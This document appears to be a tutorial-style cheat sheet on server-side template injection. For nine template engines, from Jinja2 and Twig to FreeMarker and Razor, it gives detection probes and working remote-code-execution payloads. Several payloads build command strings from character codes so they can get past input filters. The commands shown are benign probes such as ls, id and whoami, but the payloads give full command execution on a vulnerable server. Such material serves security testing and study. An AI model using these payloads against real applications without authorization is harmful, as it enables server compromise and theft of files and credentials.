# Server-side Template Injection (SSTI)

When user input is directly embedded in templates without proper validation or escaping, attackers can craft payloads that alter the template's behaviour. This can lead to various unintended server-side actions, including:

* Reading or modifying server-side files.
* Executing system commands.
* Accessing sensitive information (e.g., environment variables, database credentials).

## Common Template Engines

* [Jinja2 (Python)](#1-jinja2-python)
* [Mako (Python)](#2-mako-python)
* [Pug/Jade (NodeJS)](#3-pugjade-nodejs)
* [Smarty (PHP)](#4-smarty-php)
* [Twig (PHP)](#5-twig-php)

## How Template Engines Parse and Process Inputs

Template engines work by parsing template files, which contain static content mixed with special syntax for dynamic content. When rendering a template, the engine replaces the dynamic parts with actual data provided at runtime. For example:

```python
from jinja2 import Template

hello_template = Template("Hello, {{ name }}!")
output = hello_template.render(name="World")
print(output)
```

In this example, `{{ name }}` is a placeholder that gets replaced with the value `"World"` during rendering.

---

## **1. Jinja2 (Python)**

If you use the payload `{{7*'7'}}` in an application that uses Jinja2, the output would be `7777777`.

using payload `{{7*7}}`  will give the output `49`.

![img](/img/SSTI/1.png)

Once Jinja2's use is confirmed, we can try the following payloads:

`{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls").read()}}`

`{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}`

**Breakdown:**

* `"".__class__.__mro__[1]`: accesses the base `object` class, the superclass of all Python classes.
* `__subclasses__()`: Lists all subclasses of `object`, and `[157]` is typically the index for the `subprocess.Popen` class (this index may vary and should be checked in the target environment).

![img](/img/SSTI/2.png)
![img](/img/SSTI/3.png)

The subsequent method chains dynamically import and use the subprocess module to execute the ls command, capturing its output.

![img](/img/SSTI/4.png)

### FIX **check_output('ls -al')**

To properly execute the ls command with options using check_output, you should pass the command and its arguments as separate elements in a list:

`subprocess.check_output(['ls', '-al'])`

`{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-al'])}}`

---

## **2. Mako (Python)**

In Mako, the following payload generates the string "id" (based on `ASCII` value):

```mako
${str().join(chr(i)for(i)in[105,100])}
```

Passing this string to Python's `os.popen` function achieves RCE because it leverages system-level calls to bypass input filters:

```mako
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

![img](/img/SSTI/5.png)

---

## **3. Pug/Jade (NodeJS)**

Pug, formerly known as Jade, uses a different syntax for handling expressions, which can be exploited to identify its usage. Pug/Jade evaluates JavaScript expressions within `#{}`. For example, using the payload `#{7*7}` would return `49`.

![img](/img/SSTI/6.png)

Unlike Jinja2 or Twig, Pug/Jade directly allows JavaScript execution within its templates without the need for additional delimiters like `{{ }}`. For example:

`#{root.process.mainModule.require('child_process').spawnSync('id').stdout}`

**Breakdown:**

* `root.process`: accesses the global process object from `Node.js` within the Pug template.
* `mainModule.require('child_process')`: dynamically requires the `child_process` module, bypassing potential restrictions that might prevent its regular inclusion.
* `spawnSync('id')`: Executes the `id` command synchronously.
* `.stdout`: Captures the standard output of the command, which includes the directory listing.

![img](/img/SSTI/7.png)

### FIX spawnSync('ls -al')

`spawnSync('ls', ['-al'])`

`#{root.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}`

---

## **4. Smarty (PHP)**

Inject a simple Smarty tag like `{'Hello'|upper}` to see if it will be processed. If the application returns "HELLO", it means that the template engine used by the application is Smarty.

![img](/img/SSTI/8.png)

Once you confirm that the site is vulnerable to SSTI via Smarty, you can craft a payload that uses PHP functions that execute system commands. One of the most common functions that do this is the `system()` function. Using the payload `{system("ls")}` is a direct and effective payload if Smarty's security settings allow PHP function execution.

![img](/img/SSTI/9.png)

### Alternatively

In the PHP template engine Smarty, the `chr` function is used to generate a character from its `ASCII` value. By employing the variable modifier `cat`, individual characters are concatenated to form the string "`id`" as follows:

```smarty
{chr(105)|cat:chr(100)}
```

we can use the function `passthru` to execute our generated string and achieve RCE:

```smarty
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

---

## **5. Twig (PHP)**

If you use the payload `{{7*'7'}}` in Twig, the output would be 49.

![img](/img/SSTI/10.png)

we can surmount this challenge by leveraging Twig's block feature and built-in _charset variable. By nesting these elements, the following payload was produced successfully:

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

Alternatively, the following payload, which harnesses the built-in _context variable, also achieves RCE – provided that the template engine performs a double-rendering process:

```twig
{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
```

it only works on `Twig 2.10+` with `map` enabled.

---
---
---
---
---
---
---
---

## Blade exploitation: advanced techniques in Laravel’s template engine

Blade, the default template engine for `Laravel`, uses the built-in `chr` function to convert hexadecimal values into their corresponding characters. These characters can then be inserted into `array_map` and joined together using `implode` to form a string.

For example, the following code generates the string "`id`":

```Blade
{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}
```

This string is then passed to the `passthru` function to execute the `id` command, resulting in remote code execution:

```Blade
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

---

## Groovy exploitation: payload development in Java-based systems

Groovy, a Java-based scripting language commonly used in Grails applications, offers powerful capabilities for dynamic code execution. You can bypass security filters by constructing strings from ASCII codes and executing them as system commands with this method…

```groovy
${((char)105).toString()+((char)100).toString()}
```

Or this method...

```groovy
${x=new String();for(i in[105,100]){x+=((char)i)}}
```

The `execute` function can then run the constructed string as a system command:

```groovy
${x=new String();for(i in[105,100]){x+=((char)i).toString()};x.execute().text}
```

For a payload with no spaces, you may use multi-line comments (/**/) as an alternative:

```groovy
${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
```

---

## FreeMarker exploitation: leveraging unconventional functions in creative ways

FreeMarker is a popular template engine used in Java-based applications, and is supported by a variety of frameworks, including Spring and Apache Struts.

`lower_abc`. This function converts int-based values into alphabetic strings – but not in the way you might expect from functions such as `chr` in Python, as the documentation for `lower_abc` explains:

Converts `1`,`2`, `3`, etc., to the string `"a"`, `"b"`, `"c"`, etc. When reaching `"z"`, it continues like `"aa"`, `"ab"`, etc. This is the same logic that you can see in column labels in spreadsheet applications (like Excel or Calc). The lowest allowed number is `1`. There's no upper limit. If the number is `0` or less or it isn't an integer number then the template processing will be aborted with error.

So if you wanted a string that represents the letter `"a"`, you could use the payload:

```freemaker
${1?lower_abc}
```

The string `"aa"`, meanwhile, can be generated with the payload:

```freemaker
${27?lower_abc}
```

By using this method, you can build a string that can be used to create a payload such as the following, with the impact being RCE:

```freemaker
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
```

FreeMarker’s payload structure stands out by demonstrating how unconventional functions can be repurposed – offering an alternative pathway when typical methods are insufficient.

---

## Razor exploitation: leveraging Razor's native C# capabilities

Built into ASP.NET core, Razor is a powerful template engine capable of executing pure C# code. This capability allows for the generation of strings using the full power of the C# language, opening up a wide range of payload possibilities.

For example, the following payload generates the string "`whoami`":

```razor
@{string x=null;int[]l={119,104,111,97,109,105};foreach(int c in l){x+=((char)c).ToString();};}@x
```

To execute this command as a system command, use `@System.Diagnostics.Process.Start`, replacing `_PROGRAM_` with the desired program (for example, `cmd.exe`) and `_COMMAND_` with your generated command string:

```razor
@System.Diagnostics.Process.Start(_PROGRAM_,_COMMAND_);
```

This example shows that even modern, type-safe template engines can be vulnerable if intrinsic language features are misused.

---
